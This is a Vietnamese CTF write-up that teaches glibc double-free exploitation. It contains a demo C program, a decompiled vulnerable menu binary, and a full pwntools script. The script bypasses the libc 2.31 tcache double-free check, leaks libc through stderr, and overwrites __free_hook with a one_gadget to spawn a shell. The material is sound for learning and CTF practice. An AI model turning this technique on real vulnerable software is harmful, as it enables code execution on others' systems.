# CHALL1  - LIBC.2.31

đây 1 chall khá hay về **kĩ thuật khai thác Double Free Bug (DBF)**

- deee và trước khi giải chall này thì ta nên tìm hiểu và lỗi Double Free nhỉ ??

```(lời khuyên là các bạn nên học kĩ thuật Use After Free trước khi làm chall này, mình có để link tham khảo ở dưới)```

**Use After Free:** https://github.com/gookoosss/CTF/blob/main/PWN/training/heap/Use%20After%20Free.md

## Double Free Bug

- như ta đã học về heap thì sau khi 1 chunk được free sẽ được lưu vào bins hoặc tcache, và khi thì ta malloc 1 chunk mới có kĩ thước tương tự như các chunk ta đã free, sẽ khởi tạo chunk mới tương tự chunk đã free
- nhưng ta thử nghĩ xem chuyện gì sẽ xảy ra khi 1 chunk được free 2 lần , ta sẽ cùng xem ví dụ này để rõ hơn:

```c 
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
    puts("The goal of this is to show how we can edit a freed chunk using a Double Free bug.");
    puts("Editing freed chunks will allow us to overwrite heap metadata, which is crucial to a lot of heap attacks.");
    puts("However a bug to edit the heap metadata is often just one piece of the exploitation process.\n");

    printf("So we start off by allocating three chunks of memory. Let's also write some data to them.\n\n");

    char *ptr0, *ptr1, *ptr2;

    ptr0 = malloc(0x30);
    ptr1 = malloc(0x30);
    ptr2 = malloc(0x30);

    char *data0 = "00000000";
    char *data1 = "11111111";
    char *data2 = "22222222";

    memcpy(ptr0, data0, 0x8);
    memcpy(ptr1, data1, 0x8);   
    memcpy(ptr2, data2, 0x8);

    printf("Chunk0: @ %p\t contains: %s\n", ptr0, ptr0);
    printf("Chunk1: @ %p\t contains: %s\n", ptr1, ptr1);
    printf("Chunk2: @ %p\t contains: %s\n\n", ptr2, ptr2);

    printf("Now is where the bug comes in. We will free the same pointer twice (the first chunk pointed to by ptr0).\n");
    printf("In between the two frees, we will free a different pointer. This is because in several different versions of malloc, there is a double free check \n(however in libc-2.27 it will hit the tcache and this will be fine).\n");
    printf("It will check if the pointer being free is the same as the last chunk freed, and if it is the program will cease execution.\n");
    printf("To bypass this, we can just free something in between the two frees to the same pointer.\n\n");

    free(ptr0);
    free(ptr1);
    free(ptr0);
    
    printf("Next up we will allocate three new chunks of the same size that we freed, and write some data to them. This will give us the three chunks we freed.\n\n");

    char *ptr3, *ptr4, *ptr5;

    ptr3 = malloc(0x30);
    ptr4 = malloc(0x30);
    ptr5 = malloc(0x30);

    memcpy(ptr3, data0, 0x8);
    memcpy(ptr4, data1, 0x8);   
    memcpy(ptr5, data2, 0x8);

    printf("Chunk3: @ %p\t contains: %s\n", ptr3, ptr3);
    printf("Chunk4: @ %p\t contains: %s\n", ptr4, ptr4);
    printf("Chunk5: @ %p\t contains: %s\n\n", ptr5, ptr5);

    printf("So you can see that we allocated the same pointer twice, as a result of freeing the same pointer twice (since malloc will reuse freed chunks of similar sizes for performance boosts).\n");
    printf("Now we can free one of the pointers to either Chunk 3 or 5 (ptr3 or ptr5), and clear out the pointer. We will still have a pointer remaining to the same memory chunk, which will now be freed.\n");
    printf("As a result we can use the double free to edit a freed chunk. Let's see it in action by freeing Chunk3 and setting the pointer equal to 0x0 (which is what's supposed to happen to prevent UAFs).\n\n");


    free(ptr3);
    ptr3 = 0x0;

    printf("Chunk3: @ %p\n", ptr3);
    printf("Chunk5: @ %p\n\n", ptr5);

    printf("So you can see that we have freed ptr3 (Chunk 3) and discarded it's pointer. However we still have a pointer to it. Using that we can edit the freed chunk.\n\n");

    char *data3 = "15935728";
    memcpy(ptr5, data3, 0x8);

    printf("Chunk5: @ %p\t contains: %s\n\n", ptr5, ptr5);

    printf("Just like that, we were able to use a double free to edit a free chunk!\n");

}
```

**(ví dụ này mình lấy từ 1 write up mà mình đã nghiên cứu)**

- bây giờ ta sẽ chạy source C trên xem chuyện gì xảy ra, à mà lưu ý nên dùng phiên bản glibc từ 2.26 trở xuống để thuận tiện khai thác nha

```c 
$   ./double_free_exp 
The goal of this is to show how we can edit a freed chunk using a Double Free bug.
Editing freed chunks will allow us to overwrite heap metadata, which is crucial to a lot of heap attacks.
However a bug to edit the heap metadata is often just one piece of the exploitation process.

So we start off by allocating three chunks of memory. Let's also write some data to them.

Chunk0: @ 0x557c30676670     contains: 00000000
Chunk1: @ 0x557c306766b0     contains: 11111111
Chunk2: @ 0x557c306766f0     contains: 22222222

Now is where the bug comes in. We will free the same pointer twice (the first chunk pointed to by ptr0).
In between the two frees, we will free a different pointer. This is because in several different versions of malloc, there is a double free check 
(however in libc-2.27 it will hit the tcache and this will be fine).
It will check if the pointer being free is the same as the last chunk freed, and if it is the program will cease execution.
To bypass this, we can just free something in between the two frees to the same pointer.

Next up we will allocate three new chunks of the same size that we freed, and write some data to them. This will give us the three chunks we freed.

Chunk3: @ 0x557c30676670     contains: 22222222
Chunk4: @ 0x557c306766b0     contains: 11111111
Chunk5: @ 0x557c30676670     contains: 22222222

So you can see that we allocated the same pointer twice, as a result of freeing the same pointer twice (since malloc will reuse freed chunks of similar sizes for performance boosts).
Now we can free one of the pointers to either Chunk 3 or 5 (ptr3 or ptr5), and clear out the pointer. We will still have a pointer remaining to the same memory chunk, which will now be freed.
As a result we can use the double free to edit a freed chunk. Let's see it in action by freeing Chunk3 and setting the pointer equal to 0x0 (which is what's supposed to happen to prevent UAFs).

Chunk3: @ (nil)
Chunk5: @ 0x557c30676670

So you can see that we have freed ptr3 (Chunk 3) and discarded it's pointer. However we still have a pointer to it. Using that we can edit the freed chunk.

Chunk5: @ 0x557c30676670     contains: 15935728

Just like that, we were able to use a double free to edit a free chunk!
```

**cùng phân tích kết quả trả về nào:**
- như ta đã thấy thì ban đầu có chunk1 , chunk2 và chunk3 có 3 địa chỉ khác nhau và cũng như chứa giá trị khác nhau
- sau khi ta free lần lượt chunk1 , chunk 2 rồi free lại chunk1 (double free), thì lúc này fastbins đã lưu lần lượt là chunk1 -> chunk2 - > chunk1
- sau đó ta khởi tạo lại chunk 3, chunk 4, chunk5 có kích thước tương tự và in ra thì ta thấy rằng chunk 3 và chunk 5 có địa chỉ và giá trị như nhau , còn chunk 4 thì có địa chỉ của chunk 2
- lúc này thì nhìn lại trên source C thì ta thấy chunk 3 ta gán giá trị là 00000000 nhưng in ra là 22222222, lý do là nó bị thay đổi do lúc ta gán giá trị chunk 5
- Và chính ở đây có 1 Bug cực kỳ quan trọng đó là nếu vậy khi ta thao tác hay thay đổi bất kì thứ gì liên quan đến chunk 5 thì nó cũng sẽ làm thay đổi chunk 3, từ đó mà ta hoàn có thể lợi dụng lỗ hỏng này leak dữ liệu cũng như tấn công chunk 3 nhằm mục địch lấy shell

**=> và đây cũng chính là lỗi Double Free**

tóm tắt lại những gì mình hiểu về **Double Free Bug** là:
- Double Free Bug là lỗi 1 chunk được free 2 lần, khiến bins hay tcache lưu 1 lúc 2 chunk như nhau, khi thay đổi 1 chunk này sẽ ảnh hưởng đến chunk kia và ngược lại
- Nó có thể được sử dụng để chỉnh sửa các chunk được giải phóng và thay đổi heap metadata cùng những thứ khác. Điều này có thể rất hữu ích cho các cuộc tấn công.

### reference 

- **dreamhack:** https://learn.dreamhack.io/116#4
- **nightmath:** https://guyinatuxedo.github.io/27-edit_free_chunk/double_free_explanation/index.html

## Khai thác

và giờ ta tiếp tục giải chall này

## Ida

```c 
int menu()
{
  puts("1. Buy a book");
  puts("2. Write to book");
  puts("3. Erase content of book");
  puts("4. Read the book");
  puts("5. Exit");
  return printf("> ");
}

int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+10h] [rbp-10h]
  unsigned int size; // [rsp+14h] [rbp-Ch]

  init(argc, argv, envp);
  puts("Ebook v1.0 - Beta version\n");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu();
        __isoc99_scanf("%d");
        __isoc99_scanf("%c");
        if ( v3 != 1 )
          break;
        printf("Size: ");
        __isoc99_scanf("%u");
        __isoc99_scanf("%c");
        ptr = malloc(size);
        printf("Content: ");
        read(0, ptr, size);
        *((_BYTE *)ptr + size - 1) = 0;
      }
      if ( v3 == 2 )
        break;
      switch ( v3 )
      {
        case 3:
          if ( ptr )
          {
            free(ptr);
            puts("Done!");
          }
          else
          {
LABEL_15:
            puts("You didn't buy any book");
          }
          break;
        case 4:
          if ( !ptr )
            goto LABEL_15;
          printf("Content: %s\n", (const char *)ptr);
          break;
        case 5:
          exit(0);
        default:
          puts("Invalid choice!");
          break;
      }
    }
    if ( !ptr )
      goto LABEL_15;
    printf("Content: ");
    read(0, ptr, size);
    *((_BYTE *)ptr + size - 1) = 0;
  }
}
```

## Phân tích 

- đọc qua ida thì ta thấy option 1 sẽ malloc() tạo 1 chunk và nhập content, option2 là thay đổi content, option3 là free() chunk vừa tạo, option 4 là in ra content, cuối cùng option 5 là exit()
- ở đây có lỗi double free vì ta có thể thoải mái chọn option3
- option 4 và option 2 sẽ rất hữu ích trong việc khai thác nên ta tập trung vào nó
- ko có hàm tạo shell hay in flag, nên khả năng sẽ phải leak libc và dùng __free_hook rồi 

**phân tích vậy đủ rồi h làm thôi:**

- trước tiên cứ thử khai thác lỗi double free cái xem sao 

![image](https://github.com/gookoosss/CTF/assets/128712571/a774bb2c-08b8-4b1a-b775-40e18d8471c9)


- không được rồi vì bài này ta dùng libc 2.31 nên nó đã chặn lỗi double free, nhưng ta có thể bypass được 
- copy bug đó gòi lên web này check: https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L2930
- sau 1 hồi tìm hiểu vs tham khảo qua wu thì mình đã tìm ra cách bypass 

![image](https://github.com/gookoosss/CTF/assets/128712571/d49f39c5-fa3c-45b0-b203-ef1229257b4f)

- để ý sau khi free xong thì chunk sẽ trỏ về địa chỉ của **tcache_perthread_struck**, để bypass lỗi DBF chỉ cần cho **tcache_perthread_struck** thành null byte là được
- ta sẽ sử dụng option 2 đề đổi content thành null byte sau khi free lần 1, lúc này ta đã bypass thành công 

```python 
add(0x30, b'giabao')
delete()
edit(b'\0' * 0x30)
delete()
```

```Note: nếu bạn giải chall bằng glibc dưới 2.27 thì không cần làm các bước trên```

- bây giờ ta có thể double free rồi nên ta sẽ khai thác nó để leak libc trước 

![image](https://github.com/gookoosss/CTF/assets/128712571/a96dd32e-d0b3-4932-9eed-f3ea83be2633)


- bài này ta ko dùng unsorted bin được ,vì nếu free sẽ bị gộp vào top chunk 
- lúc này ptr của chunk 1 đang trỏ đến địa chỉ chunk 2, nếu ta thay đổi ptr của chunk 1 thì cũng thay đổi địa chỉ của chunk 2 luôn
- lợi dụng điều này ta sẽ nhập 1 địa chỉ nào đó có chứa địa chỉ libc, sau đó sử dụng option 4 để print ra nó, và ta leak được libc
- vấn đề là ta cần nhập địa chỉ nào vào nè, mình đã thử nhập hết tất cả địa chỉ GOT rồi nhưng mà đều báo lỗi, nên mình đành tham khảo wu thì biết là nên nhập địa chỉ stderr :)) 

![image](https://github.com/gookoosss/CTF/assets/128712571/3294fa97-1ef0-4487-b85e-136e71e3aeb8)


- sau khi ta nhập địa chỉ stderr(0x404040) vào chunk 1 thì chunk 2 thành 0x404040 luôn, lúc này ta malloc() 2 lần để khởi tạo lại chunk 2 và print nó ra thì sẽ leak được libc

![image](https://github.com/gookoosss/CTF/assets/128712571/3b65bca2-8218-4b8f-b151-750bfe7f9468)


- có được libc rồi thì ta double free 1 lần nữa, tương tư như trên , ta sẽ edit cho địa chỉ chunk 2 thành địa chỉ __free_hook

```python 
add(0x30, b'giabao')
delete()
edit(b'\0' * 0x30)
delete()
edit(p64(libc.sym['__free_hook']))
```
- lúc này ta tiếp tục malloc() 2 lần để khởi tạo lại chunk 2, tại đây ta nhập vào content là one_gadet và free để lấy shell 

![image](https://github.com/gookoosss/CTF/assets/128712571/28bae6c3-8403-450a-a5fa-719b87ecf2a4)


```python 
# 0xe3b01 0xe3b04
one_gadget = libc.address + 0xe3b01
add(0x30, b'giabao')
add(0x30, p64(one_gadget))
delete()
```
![image](https://github.com/gookoosss/CTF/assets/128712571/e8f1f288-2a52-4862-8ff1-d06e73c0618d)


- deee và ta đã làm được 

## script

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall1_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
p = process([exe.path])
      
gdb.attach(p, gdbscript = '''
b*main+407
b*main+329
b*main+192
b*main+241
b*main+488
c
''')
           
input()

def add(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Content: ', data)

def delete():
    p.sendlineafter(b'> ', b'3')

def edit(data):
    p.sendlineafter(b'> ', b'2')
    p.sendafter(b'Content: ', data)

def show():
    p.sendlineafter(b'> ', b'4')

############################
### stage 1: double free ###
############################

add(0x30, b'giabao')
delete()
edit(b'\0' * 0x30)
delete()

############################
### stage 2: leak libc   ###
############################

# offset == 0x1ed5c0
edit(p64(exe.sym['stderr']))
add(0x30, b'giabao')
add(0x30, b'\xc0')
show()

p.recvuntil(b'Content: ')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x1ed5c0
log.info('libc leak: ' + hex(libc_leak))
log.info('libc base: ' + hex(libc.address))

############################
### stage 3: __free_hook ###
############################

add(0x30, b'giabao')
delete()
edit(b'\0' * 0x30)
delete()
edit(p64(libc.sym['__free_hook']))

############################
### stage 1: get shell   ###
############################

one_gadget = libc.address + 0xe3b01
add(0x30, b'giabao')
add(0x30, p64(one_gadget))
delete()

p.interactive()
```





